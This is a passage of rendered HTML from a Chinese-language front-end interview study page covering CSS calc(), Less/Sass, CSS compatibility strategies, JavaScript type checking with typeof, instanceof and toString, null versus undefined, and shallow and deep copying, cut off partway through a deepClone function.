<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'stop'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">cancelAnimationFrame</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h5 id="calc函数"><a href="#calc函数" class="header-anchor">#</a> calc函数</h5> <p>calc函数是css3新增的功能，可以使用calc()计算border、margin、pading、font-size和width等属性设置动态值。</p> <div class="language-css line-numbers-mode"><pre class="language-css"><code><span class="token selector">#div1</span> <span class="token punctuation">{</span>
    <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
    <span class="token property">left</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span>
    // <span class="token property">left</span><span class="token punctuation">:</span> ~<span class="token string">&quot;calc(50% + 150px)&quot;</span><span class="token punctuation">;</span> //水平方向
    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token function">calc</span><span class="token punctuation">(</span> 100% / <span class="token punctuation">(</span>100px * 2<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    //兼容写法  运算符【前后都需要保留一个空格】
    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token function">-moz-calc</span><span class="token punctuation">(</span> 100% / <span class="token punctuation">(</span>100px * 2<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token function">-webkit-calc</span><span class="token punctuation">(</span> 100% / <span class="token punctuation">(</span>100px * 2<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">border</span><span class="token punctuation">:</span> 1px solid black<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h3 id="_9-less-sass"><a href="#_9-less-sass" class="header-anchor">#</a> 9:Less/Sass</h3> <h4 id="css-预处理器-后处理器"><a href="#css-预处理器-后处理器" class="header-anchor">#</a> CSS 预处理器 / 后处理器</h4> <blockquote><p>Less和sass等是 CSS 预处理语言，它扩展了 CSS 语言，增加了<strong>变量、Mixin、函数等特性和嵌套写法，使 CSS 更易维护和扩展。</strong></p></blockquote> <ul><li><strong>预处理器</strong>   例如：LESS、<strong>Sass</strong>、Stylus，用来预编译Sass或less，<strong>增强了css代码的复用性</strong>，
还有层级、mixin、变量、循环、函数等，具有很方便的UI组件模块化开发能力，极大的提高工作效率。</li> <li><strong>后处理器</strong>   例如：<strong>PostCSS</strong>, 通常被视为在完成的样式表中根据CSS规范处理CSS，让其更有效；目前最常做的
是给CSS属性<strong>添加浏览器私有前缀，实现跨浏览器兼容性的问题</strong>。</li></ul> <h3 id="_10-css兼容性"><a href="#_10-css兼容性" class="header-anchor">#</a> 10:css兼容性</h3> <ul><li>渐进增强则是<strong>从一个非常基础的、能够起作用的版本开始，并不断扩充，以适应未来环境的需要</strong>。【增兼前】</li> <li>而优雅降级是<strong>从复杂的现状开始，并试图减少用户体验的供给</strong>；【降兼后】</li></ul> <p>狭义区别：<strong>渐进增强一般说的是使用CSS3技术，在不影响老浏览器的正常显示与使用情形下来增强体验</strong>，而<strong>优雅降级则是体现html标签的语义，以便在js/css的加载失败/被禁用时，也不影响用户的相应功能</strong>。</p> <div class="language-css line-numbers-mode"><pre class="language-css"><code><span class="token selector">.transition</span> <span class="token punctuation">{</span> <span class="token comment">/*前面 渐进增强写法*/</span>
  <span class="token property">-webkit-transition</span><span class="token punctuation">:</span> all .5s<span class="token punctuation">;</span>
     <span class="token property">-moz-transition</span><span class="token punctuation">:</span> all .5s<span class="token punctuation">;</span>
       <span class="token property">-o-transition</span><span class="token punctuation">:</span> all .5s<span class="token punctuation">;</span>
          <span class="token property">transition</span><span class="token punctuation">:</span> all .5s<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token selector">.transition</span> <span class="token punctuation">{</span> <span class="token comment">/*优雅降级写法 后面*/</span>
          <span class="token property">transition</span><span class="token punctuation">:</span> all .5s<span class="token punctuation">;</span>
       <span class="token property">-o-transition</span><span class="token punctuation">:</span> all .5s<span class="token punctuation">;</span>
     <span class="token property">-moz-transition</span><span class="token punctuation">:</span> all .5s<span class="token punctuation">;</span>
  <span class="token property">-webkit-transition</span><span class="token punctuation">:</span> all .5s<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h1 id="js相关部分"><a href="#js相关部分" class="header-anchor">#</a> js相关部分</h1> <h2 id="js-10题"><a href="#js-10题" class="header-anchor">#</a> js[10题]</h2> <h3 id="基础"><a href="#基础" class="header-anchor">#</a> 基础</h3> <h4 id="_1-类型及判断比较【ssbnnubo】"><a href="#_1-类型及判断比较【ssbnnubo】" class="header-anchor">#</a> 1:类型及判断比较【SSBNNUBO】</h4> <p>7种基本类型：Number、String、Boolean、Null、Undefined、Symbol（ES6）, BigInt。其他全部都是 Object（引用类型）。【SSBNNUB】; 把ES6的<code>Symbol</code>和ES10的<code>BigInt</code>也加上去；<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Data_structures" target="_blank" rel="noopener noreferrer"><strong>总共8种</strong><span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <ul><li>基础类型：symbol（ES6)、String、Boolean、Number、Null、Undefined; 简写：<strong>SSBNNU</strong> <em><strong>栈(stack)</strong></em></li> <li>引用类型：Object;(数组Array，函数Function，对象Object);  <em><strong>栈(stack),堆(heap)</strong></em></li> <li>判断比较： ===,typeof, instanceof, constructor, Object.prototype.toString.call()
<img src="/rat-summ/assets/img/16-27-49.f965bcdd.jpg" alt=""></li></ul> <h4 id="_2-判断比较的区别及原理"><a href="#_2-判断比较的区别及原理" class="header-anchor">#</a> 2:判断比较的区别及原理</h4> <h5 id="object-is"><a href="#object-is" class="header-anchor">#</a> ==/===/Object.is()</h5> <p>== : 只进行值的比较,会进行数据类型的转换。 === : 不仅进行值得比较，不进行转换。还要进行数据类型的比较。</p> <blockquote><p><strong>一言以蔽之</strong>：<code>==</code>先转换类型再比较，<code>===</code>先判断类型，如果不是同一类型直接为<code>false</code>。</p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span>a<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span> <span class="token operator">==</span> <span class="token string">&quot;[object Object]&quot;</span> <span class="token comment">//true, 左边会执行 .toString()</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><strong>Object.is()</strong>:用来比较两个值是否严格相等，与严格比较运算符（===）的行为基本一致;不同之处只有两个：<strong>一是+0不等于-0，二是NaN等于自身。</strong><code>Object.is(v1, v2)</code> 修复了 <code>===</code> 的一些BUG <code>(-0和+0, NaN和NaN)</code>：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">+</span><span class="token number">0</span> <span class="token operator">===</span> <span class="token operator">-</span><span class="token number">0</span> <span class="token comment">//true           NaN === NaN//false    </span>
Object<span class="token punctuation">.</span><span class="token function">is</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">//false  Object.is(NaN, NaN) //true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h5 id="typeof-instanceof-constructor-object-prototype-tostring-call"><a href="#typeof-instanceof-constructor-object-prototype-tostring-call" class="header-anchor">#</a> typeof/instanceof/constructor/Object.prototype.toString.call()</h5> <blockquote><h4 id="tico"><a href="#tico" class="header-anchor">#</a> TICO</h4></blockquote> <ul><li><p><strong>typeof</strong>优点：能够快速区分基本数据类型 缺点：不能将Object、Array和Null区分，都返回object；</p></li> <li><p><strong>instanceof</strong>优点：能够区分Array、Object和Function，适合用于判断自定义的类实例对象 缺点：Number，Boolean，String基本数据类型不能判断；</p></li> <li><p>**constructor作用和instanceof非常相似。**但constructor检测 Object与instanceof不一样，<strong>还可以处理基本数据类型的检测</strong>。<em>但它不能检测null 和 undefined</em>   ；<code>const targetObj = source.constructor === Array ? [] : {}; // 判断复制的目标是数组还是对象</code></p></li> <li><p>**Object.prototype.toString.call()**优点：精准判断数据类型 缺点：写法繁琐不容易记，推荐进行封装后使用；<strong>toString() 是 Object 的原型方法，调用该方法，默认返回当前对象的 [[Class]]</strong> 。这是一个内部属性，其格式为 [object Xxx] ，其中 Xxx 就是对象的类型。</p> <p>对于 Object 对象，直接调用 toString() 就能返回 [object Object] 。而对于其他对象，则需要通过 call / apply 来调用才能返回正确的类型信息。</p></li> <li><p>Array.isArray(xxx)：判断是否为数组;检测某个值是否为数组(ES6)</p></li></ul> <p>实践：</p> <blockquote><h5 id="检测引用类型"><a href="#检测引用类型" class="header-anchor">#</a> 检测引用类型</h5></blockquote> <ol><li>通过 <code>instanceof</code> 判断引用类型；测试一个对象<strong>在其原型链中是否存在一个构造函数的 prototype 属性</strong>。</li> <li>通过 <code>constructor</code> 判断引用类型（<code>constructor</code>是可写的，慎用）;   打印:  <code>Array</code></li> <li>通过 <code>Object.prototype.toString.call</code> 检测 <code>[[class]]</code>；打印：<code>[object Function]</code></li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">// number</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// boolean</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token string">'str'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">// string</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// undefined</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// function</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// object</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// object </span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// object</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token keyword">instanceof</span> <span class="token class-name">Number</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// false</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token boolean">true</span> <span class="token keyword">instanceof</span> <span class="token class-name">Boolean</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// false </span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'str'</span> <span class="token keyword">instanceof</span> <span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// false  </span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token keyword">instanceof</span> <span class="token class-name">Function</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token keyword">instanceof</span> <span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// true</span>

<span class="token keyword">var</span> toString <span class="token operator">=</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>toString<span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment">//[object Number]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">//[object Boolean]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">'str'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">//[object String]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment">//[object Array]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//[object Function]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment">//[object Object]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">//[object Undefined]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">//[object Null]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><h5 id="原理分析"><a href="#原理分析" class="header-anchor">#</a> 原理分析</h5> <p><code>instanceof</code> 内部机制是通过<strong>判断对象的原型链中是不是能找到对应的的<code>prototype</code></strong>； 基础类型没有 <code>__proto__</code>；</p> <p><code>f</code> 的隐式原型 <code>__proto__</code> 和 <code>Foo.prototype</code> ，是相等的，所以返回 <code>true</code> 。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token keyword">instanceof</span> <span class="token class-name">Function</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token keyword">instanceof</span> <span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token keyword">instanceof</span><span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> target</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 实现 instanceof</span>
 <span class="token comment">// 验证如果为基本数据类型，就直接返回 false</span>
  <span class="token keyword">const</span> baseType <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'string'</span><span class="token punctuation">,</span> <span class="token string">'number'</span><span class="token punctuation">,</span> <span class="token string">'boolean'</span><span class="token punctuation">,</span> <span class="token string">'undefined'</span><span class="token punctuation">,</span> <span class="token string">'symbol'</span><span class="token punctuation">]</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>baseType<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token boolean">false</span> <span class="token punctuation">}</span>

  obj <span class="token operator">=</span> obj<span class="token punctuation">.</span>__proto__<span class="token comment">// 获得对象的原型</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 判断对象的类型是否等于类型的原型</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 如果__proto__ === null 说明原型链遍历完毕</span>
      <span class="token keyword">return</span> <span class="token boolean">false</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// 如果存在 obj.__proto__ === target.prototype;说明对象是该类型的实例</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token operator">===</span> target<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token boolean">true</span>
    <span class="token punctuation">}</span>
    obj <span class="token operator">=</span> obj<span class="token punctuation">.</span>__proto__<span class="token comment">// 原型链上查找</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>示例：现在有 x instanceof y 一条语句，则其内部实际做了如下判断：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">while</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>__proto__<span class="token operator">!==</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>__proto__<span class="token operator">===</span>y<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    x<span class="token punctuation">.</span>__proto__ <span class="token operator">=</span> x<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>proto__<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>__proto__<span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span class="token comment">//x会一直沿着隐式原型链__proto__向上查找直到x.__proto__.__proto__......===y.prototype为止，如果找到则返回true，也就是x为y的一个实例。否则返回false，x不是y的实例。</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><blockquote><h4 id="如果用-instanceof-判断基础类型会怎么样"><a href="#如果用-instanceof-判断基础类型会怎么样" class="header-anchor">#</a> 如果用 instanceof 判断基础类型会怎么样？</h4></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> str <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>str <span class="token keyword">instanceof</span> <span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token comment">// -&gt; false; 因为基础类型没有 `__proto__`</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>但是如果更改了实现检查的话; <strong>静态方法<code>Symbol.hasInstance</code>就可以判断</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">StringType</span> <span class="token punctuation">{</span>
  <span class="token keyword">static</span> <span class="token punctuation">[</span>Symbol<span class="token punctuation">.</span>hasInstance<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">typeof</span> val <span class="token operator">===</span> <span class="token string">'string'</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>str <span class="token keyword">instanceof</span> <span class="token class-name">StringType</span><span class="token punctuation">)</span> <span class="token comment">// -&gt; true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><blockquote><h4 id="undeclared-和-undefined-区别"><a href="#undeclared-和-undefined-区别" class="header-anchor">#</a> undeclared 和 undefined 区别</h4></blockquote> <ul><li>undefined：声明了变量，但是没有赋值</li> <li>undeclared：没有声明变量就直接使用</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> a<span class="token punctuation">;</span> <span class="token comment">//undefined</span>
b<span class="token punctuation">;</span>    <span class="token comment">// b is not defined</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><blockquote><h4 id="null和undefined的异同点有哪些"><a href="#null和undefined的异同点有哪些" class="header-anchor">#</a> null和undefined的异同点有哪些？</h4></blockquote> <p>相同点</p> <ul><li>都是空变量</li> <li>都是假值，转布尔值都是false</li> <li>null == undefined 为 true</li></ul> <p>不同点</p> <ul><li>typeof判断null为object，判断undefined为undefined</li> <li>null转数字为0，undefined转数字为NaN</li> <li><strong>null是一个对象未初始化，undefined是初始化了，但未定义赋值</strong></li> <li>null === undefined 为 false</li></ul> <blockquote><h4 id="null-null-为什么是-true"><a href="#null-null-为什么是-true" class="header-anchor">#</a> null &gt;= null 为什么是 true？</h4></blockquote> <p>按照<code>隐式转换规则</code>，可转换成<code>0 &gt;= 0</code>，0 等于 0，所以是<code>true</code></p> <blockquote><h4 id="为什么typeof-null-是object"><a href="#为什么typeof-null-是object" class="header-anchor">#</a> 为什么typeof null 是object？</h4></blockquote> <p><strong>不同的数据类型在底层都是通过二进制表示的，二进制前三位为<code>000</code>则会被判断为<code>object</code>类型，而null底层的二进制全都是0</strong>，那前三位肯定也是<code>000</code>，所以被判断为<code>object</code></p> <blockquote><h4 id="undefined-undefined-为什么是-false"><a href="#undefined-undefined-为什么是-false" class="header-anchor">#</a> undefined &gt;= undefined 为什么是 false ？</h4></blockquote> <p>按照<code>隐式转换规则</code>，可转换成<code>NaN &gt;= NaN</code>，NaN 不等于 NaN，也不大于，所以是<code>false</code></p> <h4 id="_3-浅深拷贝"><a href="#_3-浅深拷贝" class="header-anchor">#</a> 3:浅深拷贝</h4> <ul><li>深拷贝层层拷贝，浅拷贝只拷贝第一层，深层只是引用</li> <li>在深拷贝中，新对象中的更改不会影响原始对象，而在浅拷贝中，新对象中的更改，原始对象中也会跟着改。</li> <li>在深拷贝中，原始对象不与新对象共享相同的属性，而在浅拷贝中，它们具有相同的属性。</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">simpleClone</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//浅拷贝</span>
  <span class="token keyword">let</span> newObj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    newObj<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> newObj<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//方式一：直接用instancof/typeof判断；【推荐】简洁；</span>
<span class="token keyword">function</span> <span class="token function">deepClone</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">var</span> newObj<span class="token operator">=</span> obj <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token operator">?</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token keyword">in</span> obj<span class="token punctuation">)</span><span class="token punctuation">{</span>
